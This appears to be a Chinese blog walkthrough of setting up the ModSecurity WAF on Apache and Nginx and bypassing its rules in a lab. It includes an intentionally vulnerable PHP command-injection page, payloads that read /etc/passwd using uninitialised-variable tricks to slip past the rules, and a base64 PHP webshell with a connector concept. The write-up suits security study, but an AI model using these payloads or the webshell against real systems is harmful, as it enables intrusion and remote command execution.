---
layout: about
category: about
Researchname:  Mod-Waf-Bypass-Walkthrough
toc: true
permalink: /about/Mod-Waf-Bypass-Walkthrough/
---

# 「分享」ModsecWAF：老牌开源waf的绕过历程

## 零：连喊三声「WAF」

### 0x01 拿来WAF
依稀记得高中的一位物理老师的一段话，就拿这段话来开始吧；背景是当时刚学物理课程，很多人学会物理公式仅限于会用，他们在课堂上对我们的物理老师表达出了焦虑。
当然，研究生学历的物理老师对于这种学习上的困扰必然是经历过，然后提出了下面的观点，原话记不太清了，所以只能大概表述出意思：

>我知道你们现在有些迷茫，当然也是正常的。但是你们要想在某些领域上有所建树、突破，就要学会站在巨人的肩膀上看这个世界，鲁迅提出的拿来主义我觉得很适合用来学物理；
>**不管这些物理公式为什么是这样的、怎么得来的，先拿来用。**

「拿来主义」：
>是民国时期面对外来文化的冲击和中国封建时代遗留下来的文化，如何选择和取舍，于当时中国流行的闭关主义和全面西化的不同呼声；
>**鲁迅主张，既非被动地被“送去”，亦非不加分析地“拿来”，而是通过实用主义的观点选择性的“拿来”。**

所以我想：针对WAF也可以这样来学习，不知道WAF的工作原理没有关系，我们先把开源的WAF拿过来用，用了才知道WAF的优点、缺点；

同样的：只有用过之后，我们看到拦截日志后可以知道WAF的正则表达规则库，可以对WAF的工作方式有一些了解。

### 0x02 部署WAF

---

#### # Apache部署

[_进一步了解：APACHE中间件链接ModSec_](https://zhuanlan.zhihu.com/p/104931385){:target="_blank"}

没什么好说的，跟着教程一步步走基本上都能搞定。直接上部署成功的图：
![apache-modsec-waf.png](https://i.loli.net/2021/11/18/F3DUGveCgpkVqcl.png)
如上图，部署成功后可以看到访问`http://localhost?doc=/bin/ls`，WAF给出拦截操作，日志记录提示触发了`unix-shell.data`规则导致拦截返回403；

#### # Nginx部署

[_进一步了解：Nginx中间件链接ModSec_](https://zhuanlan.zhihu.com/p/80866123){:target="_blank"}


![nginx-modsec-waf.png](https://i.loli.net/2021/11/18/cpsgLRObd9BTDao.png)
同样的：访问`localhost:8011/?and 1=2--+`，触发WAF拦截规则返回403；需要注意的是：
- nginx版本，教程中推荐的1.9版本实际操作下来无法成功编译安装，这里推荐`nginx/1.13.8`
    * `wget http://nginx.org/download/nginx-1.13.8.tar.gz`
    
- 环境lib库安装：
    *  `sudo apt-get install openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev autoconf automake libtool gcc g++ make`

- [tips]以下四条命令的含义：
    * ```bash
    $ sed -ie 's/SecDefaultAction "phase:1,log,auditlog,pass"/#SecDefaultAction "phase:1,log,auditlog,pass"/g' crs-setup.conf
    $ sed -ie 's/SecDefaultAction "phase:2,log,auditlog,pass"/#SecDefaultAction "phase:2,log,auditlog,pass"/g' crs-setup.conf
    $ sed -ie 's/#.*SecDefaultAction "phase:1,log,auditlog,deny,status:403"/SecDefaultAction "phase:1,log,auditlog,deny,status:403"/g' crs-setup.conf
    $ sed -ie 's/# SecDefaultAction "phase:2,log,auditlog,deny,status:403"/SecDefaultAction "phase:2,log,auditlog,deny,status:403"/g' crs-setup.conf
    ```
    * 将下面查看`crs-setup.conf`文件输出中1、2行（下文2、3行）的内容注释，文件中5、6行（下文6、7行）取消注释； 
    ```bash
    cat crs-setup.conf|grep SecDefaultAction
    #SecDefaultAction "phase:1,log,auditlog,pass"
    #SecDefaultAction "phase:2,log,auditlog,pass"
    # SecDefaultAction "phase:1,nolog,auditlog,pass"
    # SecDefaultAction "phase:2,nolog,auditlog,pass"
    SecDefaultAction "phase:1,log,auditlog,deny,status:403"
    SecDefaultAction "phase:2,log,auditlog,deny,status:403"
    # SecDefaultAction "phase:1,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host: %{request_headers.host}'"
    # SecDefaultAction "phase:2,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host: %{request_headers.host}'"
    ```
其他根据教程往下走即可。

### 0x03 绕过WAF

#### # 未初始变量进行绕过
跟随大佬们的脚步走，使用简单的php代码进行WAF测试：
```php
<?php
        if(isset($_GET['host'])) {
        system('dig'.$_GET['host']);
        }
?>
```
如上代码尝试绕过WAF。我们知道终端执行`dig www.baidu.com;cat /etc/passwd`实际执行如下：
```bash
dig www.baidu.com;cat /etc/passwd

; <<>> DiG 9.10.6 <<>> www.baidu.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27659
;; flags: qr rd; QUERY: 1, ANSWER: 3, AUTHORITY: 5, ADDITIONAL: 4
;; WARNING: recursion requested but not available
···
···
···
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
··
··
_oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false
```
在终端下相同作用的链接符号还有`&&`；

直接传参`www.baidu.com;cat+/etc/passwd`注入明显的攻击行为直接返回403，查看日志匹配到以下特征：
- 1、`"Operator Rx' with parameter ^[\d.:]+$' against variable`，存在运算符；
- 2、`Operator PmFromFile' with parameter lfi-os-files.data'`，正则匹配到lfi-os-files的规则库；
- 3、`characters omitted`，特殊字符；
- 4、`"Operator PmFromFile' with parameter unix-shell.data'`，正则匹配到unix-shell的规则库；
- 5、`Operator Ge' with parameter 5'`，同样为存在运算符。
所以根据以上特征进行规则探测并注入fuzz：


---

- `+$u+cat+/$uetc/$upasswd$u`
- `+$ucat+$u/etc$u/passwd`
以上都返回200，但是没有回显，说明命令写的不对；

实际测试`/etc`、`/passwd`和特殊字符等不能单独出现，所以使用未初始变量`$u`包住后进行注入；
下面是实际生效的payload：
- `+$u+cat+/etc$u/passwd$u`
- `+$u+cat+$u/etc$u/passwd`
![waf-bypass-exec-command.png](https://i.loli.net/2021/11/18/FZQOLd6txseIgRu.png)


## 一：编写poc脚本连接器

通过以上绕过首发即可执行任意代码，我们可以直接写入一句话木马，但是这不是本段的重点；

本段的重点是通过实际测试发现base64编码后可以完美绕过waf，所以可以直接写入一个base64的马，然后连接，实际上就是解决实现一个webshell连接器，实现
功能类似一个蚁剑的cmd连接功能；这样以来WAF就形同虚设了。
webshell代码：
```php
<?php system(base64_decode($_GET['CMD']));?>
```
- GET/POST请求传入cmd
- base64加密参数内容
- 类似终端执行代码
实现效果如下：
![waf-bypass-shell.png](https://i.loli.net/2021/11/18/OtD5wZ6Hafyd8TJ.jpg)
参考的是[@IppSec]的代码，简单修改了部分。
[参考代码](https://github.com/IppSec/forward-shell/blob/master/forward-shell.py){:target="_blank"}

---

以上